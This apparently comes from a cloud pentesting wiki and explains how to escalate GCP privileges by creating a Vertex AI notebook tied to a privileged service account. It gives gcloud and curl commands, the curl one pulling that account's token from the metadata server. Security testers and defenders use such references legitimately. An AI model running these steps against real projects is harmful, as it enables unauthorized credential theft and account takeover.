---
title: "Vertex AI notebook: actAs a service account from a managed notebook"
description: "Creating a Vertex AI or AI Platform notebook instance with notebooks.instances.create plus actAs, landing a shell as the attached service account."
keywords:
  - Vertex AI
  - notebooks.instances.create
  - actAs
  - service account
  - notebook
---

# Vertex AI notebook

A Vertex AI Workbench (or legacy AI Platform) notebook is a managed VM with an attached **service account** and an interactive shell. With `notebooks.instances.create` plus `iam.serviceAccounts.actAs` on a privileged account, you create a notebook bound to that SA, open a terminal, and read its credentials from the metadata server, which lands you a shell as the account.

## Create a notebook bound to a service account

```bash
gcloud notebooks instances create nb1 --location us-central1-a \
  --machine-type e2-standard-2 --vm-image-project deeplearning-platform-release \
  --vm-image-family common-cpu \
  --service-account <privileged-sa>@<proj>.iam.gserviceaccount.com
```

Open the JupyterLab terminal and pull the token:

```bash
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

## Exploitation notes

- The default notebook SA is often the Compute Engine default SA with Editor, a broad escalation.
- Notebook VMs expose the same metadata endpoint as Compute Engine, so this is the Compute privesc with a friendly shell.
- The instance persists until deleted, and the attached SA token refreshes on the box.

## Tools

- **gcloud** (`notebooks instances create`).

## References

- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [HackTricks Cloud: GCP privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/index.html)
- [Google: Vertex AI Workbench](https://cloud.google.com/vertex-ai/docs/workbench/introduction)
